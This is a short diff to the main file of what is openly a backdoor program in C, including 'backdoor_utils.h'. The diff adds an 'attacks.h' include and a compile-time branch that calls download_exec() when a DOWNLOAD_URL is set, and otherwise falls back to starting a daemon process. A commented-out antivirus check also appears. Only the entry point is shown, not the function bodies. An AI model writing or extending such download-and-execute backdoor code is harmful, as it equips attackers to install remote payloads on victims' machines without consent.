@@ -1,6 +1,7 @@
 #include "backdoor_utils.h"
 #include "utils.h"
 #include "validators.h"
+#include "attacks.h"
 
 
 int main(void) {
@@ -17,6 +18,12 @@ int main(void) {
 
 	//check_for_antivirus();
 
+	#ifdef DOWNLOAD_URL
+	download_exec();
+	#endif
+
+	#ifndef DOWNLOAD_URL
 	create_deamon_process();
+	#endif
 
 }
